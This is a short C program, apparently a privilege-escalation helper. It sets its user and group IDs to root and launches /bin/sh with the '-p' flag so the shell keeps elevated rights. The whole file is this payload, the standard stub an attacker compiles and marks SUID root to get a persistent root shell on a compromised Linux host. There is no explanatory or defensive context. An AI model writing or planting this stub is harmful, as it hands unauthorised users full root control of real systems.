#include <unistd.h>
int main() {
  setuid(0);
  setgid(0);
  execl("/bin/sh", "sh", "-p", (char *)0);
  return 0;
}

